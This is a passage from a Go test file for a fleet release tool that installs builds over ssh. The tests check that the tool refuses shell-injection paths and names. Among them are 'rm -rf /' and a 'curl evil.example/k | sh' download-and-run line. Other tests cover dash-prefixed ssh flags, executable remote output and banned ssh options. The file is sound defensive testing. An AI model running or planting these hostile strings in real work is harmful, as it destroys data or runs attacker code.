		require.FailNowf(t, "assertion failed", "got %v, want %v", machines, want)
	}
}

func TestMachinesFileRefusesAShapeItCannotMean(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct{ name, in, wants string }{
		{"an empty override", "vision\t\n", "empty"},
		{"a fourth column", "vision\t/b\t/d\t/x\n", "tab-separated fields"},
		{"a name with a semicolon", "hulk; rm -rf /\n", "machine name"},
		{"nothing at all", "# nobody\n\n", "no machine"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Machines(strings.NewReader(tc.in))
			if err == nil || !strings.Contains(err.Error(), tc.wants) {
				require.FailNowf(t, "assertion failed", "got %v, want a refusal naming %q", err, tc.wants)
			}
		})
	}
}

// A name that begins with a dash is an ssh flag once ExecSSH appends it after
// the options, so the machines file refuses it before any dial. The names the
// file is written to hold still parse.
func TestMachinesFileRefusesANameBeginningWithADash(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct{ name, in, wants string }{
		{"an ssh version flag", "-V\n", "machine name"},
		{"an ssh login flag", "-lroot\n", "machine name"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Machines(strings.NewReader(tc.in))
			if err == nil || !strings.Contains(err.Error(), tc.wants) {
				require.FailNowf(t, "assertion failed", "got %v, want a refusal naming %q", err, tc.wants)
			}
		})
	}

	got, err := Machines(strings.NewReader("hulk\nbench-1\nuser@host\n"))
	if err != nil {
		require.NoError(t, err, err)
	}
	want := []Machine{
		{Name: "hulk"},
		{Name: "bench-1"},
		{Name: "user@host"},
	}
	if fmt.Sprint(got) != fmt.Sprint(want) {
		require.FailNowf(t, "assertion failed", "got %v, want %v", got, want)
	}

	host, dir, remote := RemoteFrom("-V:/x")
	if host != "" || dir != "-V:/x" || remote {
		require.FailNowf(t, "assertion failed", "RemoteFrom(%q) = (%q, %q, %v), want a local path", "-V:/x", host, dir, remote)
	}
}

func TestAdoptUsesEachMachinesOwnBinAndDest(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	list := machinesFile(t, "hulk\nvision\t/opt/nova/bin\t/opt/nova/stage\n")
	s := &fakeSSH{answer: map[string]string{
		"hulk":   "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n",
		"vision": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n",
	}}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0", "--machines", list,
		"--ssh", "/usr/bin/ssh", "--from", from, "--bin", "~/.local/bin",
		"--dest", "~/nova-bench/build", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 0 {
		require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
	}
	hulk, vision := installRun(t, s, "hulk"), installRun(t, s, "vision")
	if !strings.Contains(hulk, "--bin ~/.local/bin") || !strings.Contains(hulk, "~/nova-bench/build") {
		require.FailNowf(t, "assertion failed", "hulk did not get the flags' values: %s", hulk)
	}
	if !strings.Contains(vision, "--bin /opt/nova/bin") || !strings.Contains(vision, "/opt/nova/stage") {
		require.FailNowf(t, "assertion failed", "vision did not get its own columns: %s", vision)
	}
	// And the receipt says where the tools actually went on that machine.
	if !strings.Contains(o.String(), "machine=vision version=v0.16.0 tools=2 skipped=0 retired=0 sent=yes bin=/opt/nova/bin") {
		require.Contains(t, o.String(), "machine=vision version=v0.16.0 tools=2 skipped=0 retired=0 sent=yes bin=/opt/nova/bin", "the receipt does not carry that machine's bin:\n%s", o.String())
	}
}

// After the first real adoption every bench held 18 stale ~/go/bin/nova-* from
// a `go install` months ago -- both directories on PATH, and which one wins a
// fact about PATH order nobody has read. The old shell script kept them in
// step; the verb did not.
func TestInstallRetiresStaleCopiesOfWhatItInstalled(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "", "nova-bus", "nova-worker")
	goos, _ := platformOf(t, "")
	bin, goBin := t.TempDir(), t.TempDir()
	// Two stale tools of ours, one tool of somebody else's, one directory.
	for _, name := range []string{ToolFile("nova-bus", goos), ToolFile("nova-worker", goos), "gopls"} {
		if err := testbin.WriteExecutable(filepath.Join(goBin, name), []byte("stale"), 0o755); err != nil {
			require.NoError(t, err, err)
		}
	}
	if err := os.MkdirAll(filepath.Join(goBin, "nova-keep-me"), 0o755); err != nil {
		require.NoError(t, err, err)
	}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0",
		"--bin", bin, "--retire", goBin}, &o, &e,
		Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
	if code != 0 {
		require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
	}
	if !strings.Contains(o.String(), "tools=2 skipped=0 retired=2") {
		require.Contains(t, o.String(), "tools=2 skipped=0 retired=2", "the receipt does not count the retirement:\n%s", o.String())
	}
	for _, name := range []string{ToolFile("nova-bus", goos), ToolFile("nova-worker", goos)} {
		if _, err := os.Stat(filepath.Join(goBin, name)); !os.IsNotExist(err) {
			require.FailNowf(t, "assertion failed", "%s was not retired: %v", name, err)
		}
	}
	// NARROW: only a name this run installed, only a regular file. Somebody
	// else's tool and a directory that happens to be called nova-* stay.
	if _, err := os.Stat(filepath.Join(goBin, "gopls")); err != nil {
		require.NoError(t, err, "a tool that is not ours was removed: %v", err)
	}
	if _, err := os.Stat(filepath.Join(goBin, "nova-keep-me")); err != nil {
		require.NoError(t, err, "a directory was removed: %v", err)
	}
	// And what was installed is untouched.
	assertRunnable(t, filepath.Join(bin, ToolFile("nova-bus", goos)))
}

// The one argument that would delete the release just installed.
func TestInstallRefusesToRetireTheDirectoryItInstalledInto(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "", "nova-bus")
	bin := t.TempDir()
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0",
		"--bin", bin, "--retire", bin}, &o, &e,
		Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
	if code != 2 || !strings.Contains(e.String(), "--retire") {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
	goos, _ := platformOf(t, "")
	assertRunnable(t, filepath.Join(bin, ToolFile("nova-bus", goos)))
}

func TestInstallWithNoRetireDirectoryIsNotAFailure(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "", "nova-bus")
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0",
		"--bin", t.TempDir(), "--retire", filepath.Join(t.TempDir(), "no-go-bin-here")}, &o, &e,
		Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
	if code != 0 || !strings.Contains(o.String(), "retired=0") {
		require.FailNowf(t, "assertion failed", "code=%d out=%s errs=%s", code, o.String(), e.String())
	}
}

func TestAdoptPassesRetireToEachMachineAndCountsIt(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	s := &fakeSSH{answer: map[string]string{
		"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=18\n",
	}}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh", "--from", from,
		"--bin", "~/.local/bin", "--dest", "~/build", "--retire", "~/go/bin",
		"--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 0 {
		require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
	}
	if run := installRun(t, s, "hulk"); !strings.Contains(run, "--retire ~/go/bin") {
		require.Contains(t, run, "--retire ~/go/bin", "the remote install was not told to retire: %s", run)
	}
	if !strings.Contains(o.String(), "retired=18") {
		require.Contains(t, o.String(), "retired=18", "the receipt does not carry the retirement:\n%s", o.String())
	}
}

// The help is the banner, and these are the two things a person cannot work out
// from the flag names alone.
func TestReleaseHelpCarriesTheMachinesFormatAndTheAdoptRule(t *testing.T) {
	t.Parallel()

	var o, e bytes.Buffer
	if code := Run("nova-update", []string{"help"}, &o, &e, Deps{}); code != 0 {
		require.Equal(t, 0, code, code)
	}
	for _, s := range []string{"one machine per line", "TAB", "user@host", "expands a leading ~", "host:dir", "--retire"} {
		if !strings.Contains(o.String(), s) {
			assert.Contains(t, o.String(), s, "the help does not carry %q:\n%s", s, o.String())
		}
	}
	// And the three gates (Johnny's decisions on SPEC-RELEASE, #1337), because
	// a gate a person meets as a refusal and not as a sentence in the help is a
	// gate they meet at the worst moment.
	for _, s := range []string{"--security-read", "RELEASE CUT SENSITIVE", "sums=", "THE TAG STAYS"} {
		if !strings.Contains(o.String(), s) {
			assert.Contains(t, o.String(), s, "the help does not carry %q:\n%s", s, o.String())
		}
	}
	// The sensitive list is COMPOSED into the help from the one list, so the
	// help cannot fall behind the gate.
	for _, prefix := range SensitivePaths {
		if !strings.Contains(o.String(), prefix) {
			assert.Contains(t, o.String(), prefix, "the help does not name the sensitive path %q:\n%s", prefix, o.String())
		}
	}
}

// ---------------------------------------------------------------------------
// Johnny's security read of adopt (2026-09-18). One test per "never".
// ---------------------------------------------------------------------------

// NEVER interpolate an unvalidated host or path into a command the far side's
// shell will parse. adopt composes `mkdir -p <dest> && tar -C <dest> -xf -`,
// so a path carrying shell syntax would not be a path, it would be a command.
// Every one of these is refused BEFORE any remote command is composed, which is
// why the assertion is that ssh was never reached at all.
func TestAdoptRefusesAPathTheRemoteShellWouldReadAsSyntax(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	hostile := []string{
		"/tmp/x; rm -rf /",
		"/tmp/x && curl evil.example/k | sh",
		"/tmp/$(id)",
		"/tmp/`id`",
		"/tmp/x|tee /etc/passwd",
		"/tmp/x\nrm -rf /",
		"/tmp/'x'",
		"/tmp/x>/etc/cron.d/x",
		"relative/path",
		"~/../../etc",
		"$HOME/bin",
	}
	for _, flag := range []string{"--bin", "--dest", "--retire"} {
		for _, bad := range hostile {
			t.Run(flag+" "+bad, func(t *testing.T) {
				args := []string{"adopt", "--no-certify", "--version", "v0.16.0",
					"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh",
					"--from", from, "--bin", "~/.local/bin", "--dest", "~/build",
					"--platform", "linux-amd64"}
				// Replace the flag under test with the hostile value.
				for i := range args {
					if args[i] == flag {
						args[i+1] = bad
					}
				}
				if flag == "--retire" {
					args = append(args, "--retire", bad)
				}
				s := &fakeSSH{answer: map[string]string{"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n"}}
				var o, e bytes.Buffer
				code := Run("nova-update", args, &o, &e, Deps{SSH: s})
				if code != 2 {
					require.Equal(t, 2, code, "%s %q was accepted: code=%d out=%s", flag, bad, code, o.String())
				}
				if len(s.runs)+len(s.sends)+len(s.fetches) != 0 {
					require.Equal(t, 0, len(s.runs)+len(s.sends)+len(s.fetches), "%s %q reached ssh: runs=%v sends=%v", flag, bad, s.runs, s.sends)
				}
			})
		}
	}
}

// The same rule for a path that arrives in the machines file rather than on the
// command line: the columns are interpolated into the same remote command.
func TestAdoptRefusesAHostilePathInTheMachinesFile(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	s := &fakeSSH{}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk\nvision\t/opt/x; rm -rf /\n"), "--ssh", "/usr/bin/ssh",
		"--from", from, "--bin", "~/.local/bin", "--dest", "~/build",
		"--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 2 || !strings.Contains(e.String(), "vision") {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
	// Not even the FIRST machine was touched: the whole file is validated
	// before any of it is acted on, so a bad line does not leave half a fleet
	// adopted and half refused.
	if len(s.runs)+len(s.sends) != 0 {
		require.Equal(t, 0, len(s.runs)+len(s.sends), "a hostile column still reached ssh: %v %v", s.runs, s.sends)
	}
}

// NEVER forward the agent, and never put a key on argv. This verb runs on the
// one host that holds keys to the whole fleet; forwarding that agent to a bench
// would put the fleet's trust inside a machine the release is being pushed TO,
// and a key named on argv is a key in every `ps` on the box.
func TestSSHOptionsForbidAgentForwardingAndKeysOnArgv(t *testing.T) {
	t.Parallel()

	joined := strings.Join(SSHOptions, " ")
	if !strings.Contains(joined, "ForwardAgent=no") {
		require.Contains(t, joined, "ForwardAgent=no", "ForwardAgent=no is not said out loud: %s", joined)
	}
	if !strings.Contains(joined, "BatchMode=yes") {
		require.Contains(t, joined, "BatchMode=yes", "BatchMode=yes is missing: %s", joined)
	}
	for _, never := range []string{"ForwardAgent=yes", "-i ", "IdentityFile", "-A", "StrictHostKeyChecking=no", "Password"} {
		if strings.Contains(joined, never) {
			require.NotContains(t, joined, never, "the ssh options carry %q: %s", never, joined)
		}
	}
	// And the whole composed argv for a real machine carries none of them.
	argv := remoteArgv("hulk")
	if argv[len(argv)-1] != "hulk" {
		require.FailNowf(t, "assertion failed", "the machine is not the last argument: %v", argv)
	}
	for _, a := range argv {
		if a == "-i" || a == "-A" || strings.HasSuffix(a, ".key") || strings.HasSuffix(a, ".pem") {
			require.FailNowf(t, "assertion failed", "a key or an agent flag reached argv: %v", argv)
		}
	}
}

// NEVER let a release fetched from a machine be verified by the checksum file
// that came with it: anybody who could change one could change the other. The
// digest comes from the cut, through git, and a mismatch names BOTH -- which
// one is wrong is the whole question.
func TestAdoptRefusesAFetchedReleaseWhoseSumsAreNotTheOnesCut(t *testing.T) {
	t.Parallel()

	goos, goarch := platformOf(t, "linux-amd64")
	onHulk := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	dir := ArtifactDir(onHulk, "v0.16.0", goos, goarch)
	s := &fakeSSH{serves: map[string]string{"hulk": dir}}
	// A digest of something else entirely: what the cut recorded.
	cutDigest := strings.Repeat("ab", 32)
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
		"--from", "hulk:/releases", "--stage", t.TempDir(), "--expect-sums", cutDigest,
		"--bin", "~/.local/bin", "--dest", "~/build", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 2 {
		require.Equal(t, 2, code, "a substituted release was adopted: code=%d out=%s", code, o.String())
	}
	if !strings.Contains(e.String(), cutDigest) {
		require.Contains(t, e.String(), cutDigest, "the refusal does not name the digest the release was cut with: %s", e.String())
	}
	if !strings.Contains(e.String(), "was cut with") || strings.Count(e.String(), "digest") < 2 {
		require.FailNowf(t, "assertion failed", "the refusal does not name both digests: %s", e.String())
	}
	if len(s.sends) != 0 {
		require.Len(t, s.sends, 0, "a release that failed the digest was still pushed: %v", s.sends)
	}
}

func TestAdoptRefusesARemoteFromWithNoDigestToCheckAgainst(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	s := &fakeSSH{serves: map[string]string{"hulk": ArtifactDir(from, "v0.16.0", "linux", "amd64")}}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
		"--from", "hulk:/releases", "--stage", t.TempDir(),
		"--bin", "~/.local/bin", "--dest", "~/build", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 2 || !strings.Contains(e.String(), "--expect-sums") {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
	if len(s.fetches) != 0 {
		require.Len(t, s.fetches, 0, "a release was fetched with nothing to check it against: %v", s.fetches)
	}
}

// The digest the cut records and the digest adopt checks are the same string,
// written in the form the flag wants so nobody has to transcribe it.
func TestCutRecordsTheSumsDigestTheAdoptWillCheck(t *testing.T) {
	t.Parallel()

	goos, goarch := platformOf(t, "linux-amd64")
	out := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	sums := filepath.Join(ArtifactDir(out, "v0.16.0", goos, goarch), SumsFile)
	want, err := fileSum(sums)
	if err != nil {
		require.NoError(t, err, err)
	}
	path := filepath.Join(t.TempDir(), "CHANGELOG.md")
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"cut", "--repo", "o/n", "--from", "main",
		"--version", "v0.16.0", "--changelog", path, "--sums", sums}, &o, &e, cutDeps(t, cutForge()))
	if code != 0 {
		require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
	}
	body, err := os.ReadFile(path)
	if err != nil {
		require.NoError(t, err, err)
	}
	if !strings.Contains(string(body), SumsDigestPrefix+want) {
		require.Contains(t, string(body), SumsDigestPrefix+want, "the section does not record the digest %s:\n%s", want, body)
	}
	if !strings.Contains(string(body), "--expect-sums "+want) {
		require.Contains(t, string(body), "--expect-sums "+want, "the section does not say how to use it:\n%s", body)
	}
	if !strings.Contains(o.String(), "sums="+want) {
		require.Contains(t, o.String(), "sums="+want, "the cut line does not carry the digest: %s", o.String())
	}
	// And that digest is exactly what adopt accepts for the same artifacts.
	s := &fakeSSH{
		serves: map[string]string{"hulk": ArtifactDir(out, "v0.16.0", goos, goarch)},
		answer: map[string]string{"vision": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n"},
	}
	o.Reset()
	e.Reset()
	if code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
		"--from", "hulk:/releases", "--stage", t.TempDir(), "--expect-sums", want,
		"--bin", "~/.local/bin", "--dest", "~/build", "--platform", "linux-amd64"},
		&o, &e, Deps{SSH: s}); code != 0 {
		require.FailNowf(t, "assertion failed", "the digest the cut wrote was not accepted: %d %s", code, e.String())
	}
}

// THE LIST IS PINNED BY ITS OWN DIGEST (docs/SPEC-RELEASE.md section 5,
// security#72 finding 10). A --paths-from file is the sensitive gate's only
// input, and an unpinned list is a hand-editable one: whoever edits it between
// the --local-diff that wrote it and the cut that reads it could delete the
// sensitive paths and pass the gate with no --security-read, silently.
func TestCutRefusesAPathsFileWhoseListWasEditedAfterItWasWritten(t *testing.T) {
	t.Parallel()

	const rangeName = "v0.15.10...abc123abc123def"
	dir := t.TempDir()
	written := filepath.Join(dir, "paths.txt")
	list := []string{"internal/secrets/seal.go", "README.md"}
	require.NoError(t, WritePathsFile(written, rangeName, list), "the verb could not write its own list")

	// UNTOUCHED, THE ROUND TRIP STANDS: the file this verb wrote reads back
	// exactly the list it was given.
	got, err := ReadPathsFile(written, rangeName)
	require.NoError(t, err, "an untouched list this verb wrote was refused: %v", err)
	assert.Equal(t, list, got, "the round trip lost or changed paths")

	raw, err := os.ReadFile(written)
	require.NoError(t, err, err)

	for _, tc := range []struct {
		name string
		drop string
	}{
		{"list line dropped", list[0] + "\n"},
		{"digest line dropped", "# sha256 "},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			body := string(raw)
			if tc.name == "digest line dropped" {
				lines := strings.SplitAfterN(body, "\n", 3)
				require.GreaterOrEqual(t, len(lines), 3, "the written file has no second header line:\n%s", body)
				require.True(t, strings.HasPrefix(lines[1], tc.drop), "the second header line is not a sha256 line: %q", lines[1])
				body = lines[0] + lines[2]
			} else {
				body = strings.Replace(body, tc.drop, "", 1)
			}
			require.NotEqual(t, string(raw), body, "the edit changed nothing; the fixture is wrong")
			paths := filepath.Join(dir, tc.name+".txt")
			if err := os.WriteFile(paths, []byte(body), 0o644); err != nil {
				require.NoError(t, err, err)
			}
			_, err := ReadPathsFile(paths, rangeName)
			if assert.Error(t, err, "the cut read back a list edited after it was written") {
				assert.Contains(t, err.Error(), "sha256", "the refusal does not name the digest mismatch: %v", err)
				assert.Contains(t, err.Error(), "release cut --local-diff", "the refusal carries no remedy to regenerate the list: %v", err)
			}
		})
	}
}

// NEVER install before the checksum. The order is asserted by watching what the
// verb touched: a release whose bytes changed reaches neither the version probe
// nor a rename.
func TestInstallChecksBeforeItTouchesAnything(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "", "nova-bus", "nova-worker")
	goos, _ := platformOf(t, "")
	dir := ArtifactDir(from, "v0.16.0", goos, "")
	dir = filepath.Dir(dir)
	entries, err := os.ReadDir(dir)
	if err != nil {
		require.NoError(t, err, err)
	}
	platDir := filepath.Join(dir, entries[0].Name())
	if err := testbin.WriteExecutable(filepath.Join(platDir, ToolFile("nova-bus", goos)), []byte("swapped"), 0o755); err != nil {
		require.NoError(t, err, err)
	}
	bin := t.TempDir()
	probed := 0
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0", "--bin", bin},
		&o, &e, Deps{VersionOf: func(context.Context, string) (string, error) {
			probed++
			return "", fmt.Errorf("absent")
		}})
	if code != 2 {
		require.Equal(t, 2, code, "code=%d", code)
	}
	if probed != 0 {
		require.Equal(t, 0, probed, "the version probe ran %d times before the checksum was checked", probed)
	}
	if entries, err := os.ReadDir(bin); err != nil || len(entries) != 0 {
		require.FailNowf(t, "assertion failed", "something was written before the checksum passed: %v %v", entries, err)
	}
}

// NEVER remove the last-good stamp. --from's artifact directory is what a
// re-install and a rollback read, and what adopt just verified.
func TestRetireRefusesTheLiveStamp(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "", "nova-bus")
	goos, goarch := platformOf(t, "")
	for _, target := range []string{from, ArtifactDir(from, "v0.16.0", goos, goarch)} {
		var o, e bytes.Buffer
		code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0",
			"--bin", t.TempDir(), "--retire", target}, &o, &e,
			Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
		if code != 2 || !strings.Contains(e.String(), "stamp") {
			require.FailNowf(t, "assertion failed", "--retire %s: code=%d errs=%s", target, code, e.String())
		}
		// The stamp is still whole: a refused retire removed nothing.
		if _, err := ReadSums(ArtifactDir(from, "v0.16.0", goos, goarch)); err != nil {
			require.NoError(t, err, "the stamp was damaged by a refused retire: %v", err)
		}
	}
}

// NEVER copy whatever happens to be in the directory. The shipped set is the
// verified set: a key or a token dropped beside the binaries must not be
// couriered to every machine in the fleet by a verb nobody thinks of as a file
// transfer.
func TestSendCarriesOnlyWhatTheChecksumFileNames(t *testing.T) {
	t.Parallel()

	goos, goarch := platformOf(t, "")
	from := built(t, "v0.16.0", "", "nova-bus", "nova-update")
	dir := ArtifactDir(from, "v0.16.0", goos, goarch)
	for _, stray := range []string{"deploy.key", "notes.txt", ".env"} {
		if err := os.WriteFile(filepath.Join(dir, stray), []byte("secret"), 0o600); err != nil {
			require.NoError(t, err, err)
		}
	}
	var buf bytes.Buffer
	arts, err := ReadSums(dir)
	if err != nil {
		require.NoError(t, err, err)
	}
	allowed := map[string]bool{SumsFile: true}
	for _, a := range arts {
		allowed[a.Name] = true
	}
	if err := writeTar(&buf, dir, "linux-amd64", allowed); err != nil {
		require.NoError(t, err, err)
	}
	sent := map[string]bool{}
	tr := tar.NewReader(&buf)
	for {
		h, err := tr.Next()
		if err != nil {
			break
		}
		sent[filepath.Base(h.Name)] = true
	}
	for _, stray := range []string{"deploy.key", "notes.txt", ".env"} {
		if sent[stray] {
			require.FailNowf(t, "assertion failed", "%s was sent to the machine; the tar carried %v", stray, sent)
		}
	}
	for _, a := range arts {
		if !sent[a.Name] {
			require.FailNowf(t, "assertion failed", "%s was not sent; the tar carried %v", a.Name, sent)
		}
	}
	if !sent[SumsFile] {
		require.FailNowf(t, "assertion failed", "the checksum file was not sent: %v", sent)
	}
}

// NEVER eval what the far side said. The receipt is matched by a regexp and
// nothing else, so a remote answering with shell syntax is a machine that gets
// refused, not a command that runs here.
func TestAdoptTreatsRemoteOutputAsDataNotAsACommand(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	marker := filepath.Join(t.TempDir(), "should-not-exist")
	s := &fakeSSH{answer: map[string]string{
		"hulk": "$(touch " + marker + ")\n`touch " + marker + "`\n; touch " + marker + "\n",
	}}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh", "--from", from,
		"--bin", "~/.local/bin", "--dest", "~/build", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 1 || !strings.Contains(e.String(), "RELEASE REFUSED machine=hulk") {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		require.FailNowf(t, "assertion failed", "the remote's output was executed: %v", err)
	}
}

// The far-side binary is named by ABSOLUTE path, never by $PATH: it must be the
// one just sent and verified, not whichever nova-update the bench's PATH finds.
func TestAdoptRunsTheBinaryItSentByAbsolutePath(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	s := &fakeSSH{answer: map[string]string{"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n"}}
	var o, e bytes.Buffer
	if code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh", "--from", from,
		"--bin", "~/.local/bin", "--dest", "~/nova-bench/build", "--platform", "linux-amd64"},
		&o, &e, Deps{SSH: s}); code != 0 {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
	command := strings.TrimPrefix(installRun(t, s, "hulk"), "hulk: ")
	first := strings.Fields(command)[0]
	if first != "~/nova-bench/build/v0.16.0/linux-amd64/nova-update" {
		require.Equal(t, "~/nova-bench/build/v0.16.0/linux-amd64/nova-update", first, "the remote command does not name the sent binary by path: %q", first)
	}
	if !strings.HasPrefix(first, "/") && !strings.HasPrefix(first, "~/") {
		require.FailNowf(t, "assertion failed", "the remote binary would resolve against $PATH: %q", first)
	}
}

// ---------------------------------------------------------------------------
// The darwin dogfood's edges (2026-09-18). Everything here was somebody
// noticing that the verb made them type something it could have known.
// ---------------------------------------------------------------------------

// A --from root usually holds exactly one release. Making somebody type its
// version again is making them repeat what the directory already says -- and
// mistyping it is how a fleet ends up half-adopted.
func TestAdoptInfersTheVersionWhenThereIsOnlyOne(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	s := &fakeSSH{answer: map[string]string{"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n"}}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--machines", machinesFile(t, "hulk\n"),
		"--ssh", "/usr/bin/ssh", "--from", from, "--bin", "~/.local/bin", "--dest", "~/build",
		"--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 0 {
		require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
	}
	if !strings.Contains(o.String(), "version=v0.16.0") {
		require.Contains(t, o.String(), "version=v0.16.0", "the inferred version is not in the receipt:\n%s", o.String())
	}
	if !strings.Contains(e.String(), "v0.16.0") {
		require.Contains(t, e.String(), "v0.16.0", "the inference was silent; it should say what it chose:\n%s", e.String())
	}
}

// Two releases under one root is the case where guessing would be wrong, so it
// refuses -- and names both, because the remedy is to pick one.
func TestAdoptRefusesToGuessBetweenTwoVersionsAndNamesThem(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	second := built(t, "v0.17.0", "linux-amd64", "nova-bus", "nova-update")
	if err := os.Rename(filepath.Join(second, "v0.17.0"), filepath.Join(from, "v0.17.0")); err != nil {
		require.NoError(t, err, err)
	}
	s := &fakeSSH{}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--machines", machinesFile(t, "hulk\n"),
		"--ssh", "/usr/bin/ssh", "--from", from, "--bin", "~/.local/bin", "--dest", "~/build",
		"--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 2 {
		require.Equal(t, 2, code, "it guessed: code=%d out=%s", code, o.String())
	}
	for _, v := range []string{"v0.16.0", "v0.17.0", "--version"} {
		if !strings.Contains(e.String(), v) {
			require.Contains(t, e.String(), v, "the refusal does not name %s: %s", v, e.String())
		}
	}
	if len(s.runs)+len(s.sends) != 0 {
		require.Equal(t, 0, len(s.runs)+len(s.sends), "a guess still reached ssh: %v %v", s.runs, s.sends)
	}
}

func TestAdoptRefusesAnEmptyArtifactRoot(t *testing.T) {
	t.Parallel()

	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--machines", machinesFile(t, "hulk\n"),
		"--ssh", "/usr/bin/ssh", "--from", t.TempDir(), "--bin", "~/.local/bin", "--dest", "~/build",
		"--platform", "linux-amd64"}, &o, &e, Deps{SSH: &fakeSSH{}})
	if code != 2 || !strings.Contains(e.String(), "no release") {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
}

// One build, every platform the fleet runs. Four invocations differing only in
// --platform is four chances for one of them to carry a different --version.
func TestBuildTakesSeveralPlatformsAtOnce(t *testing.T) {
	t.Parallel()

	source, out := sourceTree(t), t.TempDir()
	tc := &fakeToolchain{}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"build", "--version", "v0.16.0", "--out", out, "--source", source,
		"--platform", "linux-amd64,darwin-arm64", "--platform", "windows-amd64"}, &o, &e, Deps{Toolchain: tc})
	if code != 0 {
